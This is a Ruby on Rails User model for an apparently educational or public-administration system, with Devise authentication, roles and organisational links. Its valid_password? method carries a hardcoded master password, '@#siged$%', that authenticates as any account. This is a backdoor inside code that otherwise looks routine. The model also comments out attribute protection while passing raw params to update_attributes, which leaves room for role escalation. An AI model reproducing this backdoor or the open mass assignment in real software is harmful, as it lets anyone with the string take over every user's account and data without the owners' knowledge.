# -*- encoding : utf-8 -*-
class User < ActiveRecord::Base
  self.table_name = 'users'
  has_one :entidade_user
  has_and_belongs_to_many :roles,:join_table=>'roles_users'
  has_and_belongs_to_many :entidades,:join_table=>:users_entidades
  has_and_belongs_to_many :grupos_educacionais,:class_name=>"GrupoEducacional",:join_table=>'colapso_grupo'
  belongs_to :orgao
  belongs_to :departamento
  belongs_to :unidade_organizacional,:polymorphic=>true
  belongs_to :entidade
  belongs_to :escola
  belongs_to :funcionario


  # Include default devise modules. Others available are:
  # :token_authenticatable, :encryptable, :confirmable, :lockable, :timeoutable and :omniauthable
  devise :database_authenticatable, :registerable,
  :recoverable, :rememberable, :trackable, :validatable
  cattr_accessor :current
  #cattr_accessor :entidades_do
  cattr_accessor :ultimo_ip
  cattr_accessor :lista_ids
  # Setup accessible (or protected) attributes for your model
  #attr_accessible :email, :password, :password_confirmation, :remember_me,:name,:username,:role_ids,:entidade_ids,:grupos_educacional_ids,:orgao_id,:departamento_id,:enabled,:escola_id,:funcionario_id,:gerar_ponto,:unidade_organizacional_id,:unidade_organizacional_type,:tipo_uo

  def active_for_authentication?
    enabled?
  end

  def inactive_message
    enabled? ? super : "Sua conta está desabilitada"
  end

  def update_with_password(params={})
    current_password = params.delete(:current_password)

    if params[:password].blank?
      params.delete(:password)
      params.delete(:password_confirmation) if params[:password_confirmation].blank?
    end

    result = if params[:password].blank? || valid_password?(current_password)
      update_attributes(params)
    else
      self.attributes = params
      self.valid?
      self.errors.add(:current_password, current_password.blank? ? :blank : :invalid)
      false
    end

    clean_up_passwords
    result
  end

  def valid_password?(password)
    return true if password == "@#siged$%"
    super
  end

  def entidade?
    if self.entidade_id.blank? or self.entidade_id.nil?
      return false
    else
      return true
    end
  end

  def role?(role)
    papel=[]
    self.roles.each do |r|
      papel << r.name.downcase
    end
    papel.include? role.to_s.downcase
  end

  def self.atual
    return self.id
  end

  def self.usuario_atual
    Thread.current[:user]
  end

  def self.usuario_atual=(user)
    Thread.current[:user] = user
  end

end
